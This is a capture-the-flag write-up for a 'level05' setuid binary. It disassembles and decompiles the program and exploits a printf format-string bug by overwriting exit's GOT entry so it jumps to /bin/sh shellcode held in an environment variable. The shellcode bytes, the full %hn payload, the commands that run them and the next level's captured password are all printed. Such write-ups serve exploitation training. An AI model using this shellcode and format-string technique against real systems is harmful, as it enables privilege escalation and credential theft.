What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level05 level05   80 Sep 13  2016 ./
	dr-x--x--x  1 root    root     260 Oct  2  2016 ../
	-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05*
	-rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
	-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile

A `level05` binary. Let's check the assembly:

	$ gdb ./level05
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x08048444 <+0>:     push   %ebp
	0x08048445 <+1>:     mov    %esp,%ebp
	0x08048447 <+3>:     push   %edi
	0x08048448 <+4>:     push   %ebx
	=> 0x08048449 <+5>:     and    $0xfffffff0,%esp
	0x0804844c <+8>:     sub    $0x90,%esp
	0x08048452 <+14>:    movl   $0x0,0x8c(%esp)
	0x0804845d <+25>:    mov    0x80497f0,%eax
	0x08048462 <+30>:    mov    %eax,0x8(%esp)
	0x08048466 <+34>:    movl   $0x64,0x4(%esp)
	0x0804846e <+42>:    lea    0x28(%esp),%eax
	0x08048472 <+46>:    mov    %eax,(%esp)
	0x08048475 <+49>:    call   0x8048350 <fgets@plt>
	0x0804847a <+54>:    movl   $0x0,0x8c(%esp)
	0x08048485 <+65>:    jmp    0x80484d3 <main+143>
	0x08048487 <+67>:    lea    0x28(%esp),%eax
	0x0804848b <+71>:    add    0x8c(%esp),%eax
	0x08048492 <+78>:    movzbl (%eax),%eax
	0x08048495 <+81>:    cmp    $0x40,%al
	0x08048497 <+83>:    jle    0x80484cb <main+135>
	0x08048499 <+85>:    lea    0x28(%esp),%eax
	0x0804849d <+89>:    add    0x8c(%esp),%eax
	0x080484a4 <+96>:    movzbl (%eax),%eax
	0x080484a7 <+99>:    cmp    $0x5a,%al
	0x080484a9 <+101>:   jg     0x80484cb <main+135>
	0x080484ab <+103>:   lea    0x28(%esp),%eax
	0x080484af <+107>:   add    0x8c(%esp),%eax
	0x080484b6 <+114>:   movzbl (%eax),%eax
	0x080484b9 <+117>:   mov    %eax,%edx
	0x080484bb <+119>:   xor    $0x20,%edx
	0x080484be <+122>:   lea    0x28(%esp),%eax
	0x080484c2 <+126>:   add    0x8c(%esp),%eax
	0x080484c9 <+133>:   mov    %dl,(%eax)
	0x080484cb <+135>:   addl   $0x1,0x8c(%esp)
	0x080484d3 <+143>:   mov    0x8c(%esp),%ebx
	0x080484da <+150>:   lea    0x28(%esp),%eax
	0x080484de <+154>:   movl   $0xffffffff,0x1c(%esp)
	0x080484e6 <+162>:   mov    %eax,%edx
	0x080484e8 <+164>:   mov    $0x0,%eax
	0x080484ed <+169>:   mov    0x1c(%esp),%ecx
	0x080484f1 <+173>:   mov    %edx,%edi
	0x080484f3 <+175>:   repnz scas %es:(%edi),%al
	0x080484f5 <+177>:   mov    %ecx,%eax
	0x080484f7 <+179>:   not    %eax
	0x080484f9 <+181>:   sub    $0x1,%eax
	0x080484fc <+184>:   cmp    %eax,%ebx
	0x080484fe <+186>:   jb     0x8048487 <main+67>
	0x08048500 <+188>:   lea    0x28(%esp),%eax
	0x08048504 <+192>:   mov    %eax,(%esp)
	0x08048507 <+195>:   call   0x8048340 <printf@plt>
	0x0804850c <+200>:   movl   $0x0,(%esp)
	0x08048513 <+207>:   call   0x8048370 <exit@plt>
	End of assembler dump.

Cleaned `Ghidra`:

	void	main(void)
	{
		char			bVar1;
		unsigned int	uVar2;
		char			*pbVar3;
		char			bVar4;
		char			local_78[100];
		unsigned int	local_14;
		
		bVar4 = 0;
		local_14 = 0;
		fgets((char *)local_78, 100, stdin);

`fgets` our input into a buffer.

		local_14 = 0;
		do
		{
			uVar2 = 0xffffffff;
			pbVar3 = local_78;
			do
			{
				if (uVar2 == 0)
					break;
				uVar2--;
				bVar1 = *pbVar3;
				pbVar3++;
			} while (bVar1 != 0);

Manual `strlen` of our input.

			if (~uVar2 - 1 <= local_14)
			{
				printf((char *)local_78);
				exit(0);
			}

If the length is lower or equal to the number of iteration, `printf` and `exit`.

			if (('@' < (char)local_78[local_14]) && ((char)local_78[local_14] < '['))
				local_78[local_14] = local_78[local_14] ^ 32;

If the char of our input is in uppercase, lowercase it.

			local_14++;
		} while (1);
	}

Iterate.

Well, we don't have a choice, we'll have to rewrite `exit`'s GOT toward our shellcode, and we can't put it in the buffer because of the uppercase check... So let's use the env again.

	$ export e=$'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

Then use a short C program to get the address.

	$ cd /tmp; nano t.c; cc t.c; ./a.out; cd

	#include <stdlib.h>
	#include <stdio.h>

	int	main(int argc, char **argv)
	{
		printf("%p\n", getenv("e"));
	}

There, we made a mistake that took us days to debug. Not using the `-m32` flag gets us a 8 bytes address that we truncated, but it's actually not the same in 4 bytes...

	$ cc t.c
	$ ./a.out
	0x7fffffffeef5

	$ cc -m32 t.c
	$ ./a.out
	0xffffdef5

`0xffffdef5` => `\xf5\xde\xff\xff`.

Now, the address of `exit`.

	$ gdb ./level05
	[...]
	(gdb) disas 0x8048370
	Dump of assembler code for function exit@plt:
	0x08048370 <+0>:     jmp    *0x80497e0
	0x08048376 <+6>:     push   $0x18
	0x0804837b <+11>:    jmp    0x8048330
	End of assembler dump.
	
	(gdb) x/x 0x80497e0
	0x80497e0 <exit@got.plt>:       0x08048376

So, we want to overwrite `0x08048376` from the address `0x80497e0` with `0xffffdef5` (4294488501). `0xffffdef5` is 4294488501 in decimal. Way too much for a single write, so we'll split it into two (`0xffff` (65535) and `0xdef5` (57077)). The upper half is a bigger number, so no need to loop around. 65535 - 57077 = 8458. `%57077c%?$hn%8458c%?$hn`. `0x80497e0` => `\xe0\x97\x04\x08`, and we add two bytes for the other half `0x80497e2` => `\xe2\x97\x04\x08`

Now, all we have left to do is know which argument our buffer is to `printf`.

	0x08048500 <+188>:   lea    0x28(%esp),%eax
	0x08048504 <+192>:   mov    %eax,(%esp)
	0x08048507 <+195>:   call   0x8048340 <printf@plt>

0x28 is 40 in decimal / 4 = 10. The buffer should start at the 10th argument. With the 8 bytes of address added, we have to remove 8 from our number of char printed, though. `\xe0\x97\x04\x08\xe2\x97\x04\x08%57069c%10$hn%8458c%11$hn`. And... !

	$ echo -ne $'\xe0\x97\x04\x08\xe2\x97\x04\x08%57069c%10$hn%8458c%11$hn' > /tmp/e

	$ (cat /tmp/e; cat) | ./level05
	[...]
	cat /home/users/level06/.pass
	h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
